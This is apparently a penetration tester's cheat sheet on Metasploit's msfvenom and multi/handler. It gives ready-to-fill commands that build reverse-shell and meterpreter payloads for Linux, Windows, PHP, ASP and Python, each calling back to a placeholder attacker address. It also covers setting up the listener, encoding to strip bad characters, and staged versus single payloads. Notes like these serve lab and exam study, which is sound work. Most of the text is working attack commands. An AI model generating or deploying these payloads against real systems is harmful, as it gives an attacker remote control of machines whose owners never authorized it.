`msfvenom -p PAYLOAD_PATH LHOST=X.X.X.X -f exe(FORMAT) -o payload.exe(OUTPUT)`
`msfvenom -l payloads`
`msfvenom --list formats`

`-e ENCODING -b"\x00...BYTES_TO_FILTER"
`-f FORMAT` : elf, exe, raw, python 
`-v VAR_NAME` : useful to set a variable name for script code (like with `-f python`)

#### Handlers
`use exploit/multi/handler` -> `set payload php/reverse_php` *(optional) omit for meterpreter shell*-\> `set lhost MY_IP` -\> `set lport MY_IP` -\> `run` *infers listener running*
#### Payload Examples
*must have set up listener or `exploit/multi/handler` module set up/listening for reverse shells above*
- Linux (elf): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- Windows: `msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- PHP: `msfvenom -p php/meterpreter\_reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP: `msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev\_shell.asp`
- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
- `msfvenom -l payloads | grep meterpreter`, shows reverse and bind meterpreter shells on different platforms

#### Encoders
Often they will remove bad characters (like non-alphanumeric chars that are filtered by input fields). The payload will then be decoded at run time, which requires a prepended decoder stub.
*Encoders are not intended to bypass security, but may help*:  `msfvenom -l encoders`

*Consider: target OS, programs on the system, available connection types*

# Single vs. Staged
Stages: Downloaded by the stager after access is achieved on the target
`windows/shell_reverse_tcp` - denotes a single payload, injecting into memory and calling back automatically
`windows/x64/shell/reverse_tcp` - denotes a staged payload (stager) which injects, then must reach out for part 2 of the exploit (stage), which is hosted by the attacker usually by with `exploit/multi/handler` 